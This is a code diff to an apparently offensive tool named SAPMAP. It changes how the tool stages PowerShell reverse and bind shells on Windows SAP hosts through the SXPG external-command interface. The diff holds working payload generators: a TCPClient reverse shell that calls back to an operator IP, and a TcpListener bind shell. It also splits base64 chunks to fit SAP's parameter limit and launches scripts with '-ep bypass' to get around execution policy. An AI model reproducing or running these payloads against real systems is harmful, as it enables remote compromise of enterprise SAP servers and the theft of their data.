@@ -1436,14 +1436,24 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     # SAP service user always owns — unlike C:\Windows\Temp, which may have
     # restricted ACLs or trigger AV on first access.
     #
-    # Keep filename short ("s") — the SXPG -e base64 has a 255-byte PARAMS
-    # limit and every extra char in the decode_script costs ~2 base64 chars.
-    tmp_cmd = r"%TEMP%\s"       # expanded by cmd.exe at runtime
+    # Randomise the filename per-payload.  Previously we hard-coded "s"
+    # (so %TEMP%\s + %TEMP%\s.ps1) which was short but meant a wedged
+    # bind attempt could leave an old s.ps1 in place, and a fresh
+    # reverse attempt whose delete step raced with the old process
+    # would launch the STALE bind script — the exact "reverse shell
+    # runs as bind on port 5555" mismatch operator saw on TWT.  Fresh
+    # 4-char random suffix on every call keeps names short enough to
+    # fit inside the 255-byte SXPG PARAMS limit + guarantees no
+    # cross-attempt collision.
+    import random as _r_mp
+    import string as _s_mp
+    _sfx = "".join(_r_mp.choice(_s_mp.ascii_lowercase) for _ in range(4))
+    tmp_cmd = fr"%TEMP%\s{_sfx}"    # expanded by cmd.exe at runtime
     # For PowerShell, use a double-quoted string so $env:TEMP expands:
-    #   gc "$env:TEMP\s"
+    #   gc "$env:TEMP\s<sfx>"
     # Note: \" inside the outer "-quoted -c argument is a literal double-quote
     # via CommandLineToArgvW parsing.
-    tmp_ps  = r"$env:TEMP\s"   # expanded by PowerShell at runtime
+    tmp_ps  = fr"$env:TEMP\s{_sfx}"  # expanded by PowerShell at runtime
 
     # GW path: UTF-16LE Base64 (for PowerShell Unicode.GetString decode)
     enc_u16 = base64.b64encode(
@@ -1459,7 +1469,7 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     steps = [
         # Clean up old file first (suppress "not found" errors)
         {"command": "cmd.exe",
-         "params": "/C del /q %TEMP%\\s 2>nul",
+         "params": f"/C del /q %TEMP%\\s{_sfx} 2>nul",
          "long_params": ""},
     ]
     for idx, chunk in enumerate(gw_chunks):
@@ -1491,9 +1501,9 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     # Solution: launch PowerShell detached via "cmd.exe /C start /B ...".
     # cmd.exe exits immediately after spawning powershell, SXPG returns,
     # start_connector runs and connects to the waiting bind shell.
-    sxpg_tmp_cmd = r"%TEMP%\s"       # cmd.exe path — expanded by cmd.exe
-    sxpg_tmp_ps  = r"$env:TEMP\s"    # PowerShell path — expanded by PS
-    sxpg_ps1_ps  = r"$env:TEMP\s.ps1"  # decoded script file (PS path)
+    sxpg_tmp_cmd = fr"%TEMP%\s{_sfx}"       # cmd.exe path — expanded by cmd.exe
+    sxpg_tmp_ps  = fr"$env:TEMP\s{_sfx}"    # PowerShell path — expanded by PS
+    sxpg_ps1_ps  = fr"$env:TEMP\s{_sfx}.ps1"  # decoded script file (PS path)
     enc_ascii = base64.b64encode(
         ps_script.encode("ascii")).decode("ascii")
     sxpg_chunks = [enc_ascii[i:i+chunk_size]
@@ -1511,16 +1521,17 @@ def _win_multistep_payload(ps_script: str, display: str) -> dict:
     # -ep bypass overrides the execution policy (Restricted by default on
     # Windows Server 2008 R2) which would otherwise block loading .ps1 files.
     # Inline -c commands are never blocked, only -File; so only this step needs it.
-    sxpg_final_params = "/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s.ps1"
+    sxpg_final_params = f"/C start /B powershell.exe -nop -ep bypass -File %TEMP%\\s{_sfx}.ps1"
     assert len(sxpg_decode_params) <= 255, (
         f"SXPG decode params too long: {len(sxpg_decode_params)}")
     assert len(sxpg_final_params)  <= 255, (
         f"SXPG final params too long: {len(sxpg_final_params)}")
 
     sxpg_steps = [
-        # Clean up old intermediate and script files
+        # Clean up old intermediate and script files (the randomised
+        # suffix keeps this scoped to THIS attempt's files only).
         {"command": "cmd.exe",
-         "params": "/C del /q %TEMP%\\s %TEMP%\\s.ps1 2>nul"},
+         "params": f"/C del /q %TEMP%\\s{_sfx} %TEMP%\\s{_sfx}.ps1 2>nul"},
     ]
     for idx, chunk in enumerate(sxpg_chunks):
         redir = ">" if idx == 0 else ">>"
@@ -1758,7 +1769,12 @@ def _generate_payload(os_type: str, ip: str, port: int,
     """Generate reverse shell payload based on OS type."""
     is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
     if is_win:
-        ps = (f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
+        # Leading `# SAPMAP-MODE: REVERSE port=<p> callback=<ip>` gives the
+        # operator a definitive tag if anything in the launched script
+        # leaks an error to stdout — no more confusion about whether the
+        # bind or reverse script actually ran on the target.
+        ps = (f"# SAPMAP-MODE: REVERSE port={port} callback={ip}\n"
+              f"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
               f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
               f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
               f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
@@ -1826,7 +1842,8 @@ def _generate_bind_payload(os_type: str, port: int,
         # `-ErrorAction 0` swallows the harmless "no matching
         # connection" case on a first-run target.  A short Sleep gives
         # the kernel a moment to release the port after Stop-Process.
-        ps = (f"Get-NetTCPConnection -LocalPort {port} -State Listen "
+        ps = (f"# SAPMAP-MODE: BIND port={port}\n"
+              f"Get-NetTCPConnection -LocalPort {port} -State Listen "
               f"-EA 0|%{{Stop-Process -Id $_.OwningProcess -Force -EA 0}};"
               f"Start-Sleep -Milliseconds 500;"
               f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
@@ -13252,16 +13269,19 @@ def create_app(api: SAPMAPApi) -> Bottle:
             if shell_mode == "bind":
                 payload = _generate_bind_payload(
                     node.os_type, shell_port, python_cmd=py_cmd)
-                print(f"[*] {sid}: Sending bind shell payload: "
-                      f"{payload['display']}")
-                print(f"    Will connect to {target_host}:{shell_port} "
-                      f"after payload delivery")
+                print(f"[*] {sid}: ===== BIND SHELL =====")
+                print(f"[*] {sid}: Target will LISTEN on 0.0.0.0:{shell_port}")
+                print(f"[*] {sid}: SAPMAP will CONNECT to "
+                      f"{target_host}:{shell_port} after payload delivery")
+                print(f"[*] {sid}: Payload: {payload['display']}")
             else:
                 payload = _generate_payload(
                     node.os_type, local_ip, shell_port, python_cmd=py_cmd)
-                print(f"[*] {sid}: Sending reverse shell payload: "
-                      f"{payload['display']}")
-                print(f"    Listening on 0.0.0.0:{shell_port}")
+                print(f"[*] {sid}: ===== REVERSE SHELL =====")
+                print(f"[*] {sid}: Target will CONNECT BACK to "
+                      f"{local_ip}:{shell_port}")
+                print(f"[*] {sid}: SAPMAP is LISTENING on 0.0.0.0:{shell_port}")
+                print(f"[*] {sid}: Payload: {payload['display']}")
 
             if method == "ssh":
                 print(f"    SSH interpreter chain: "
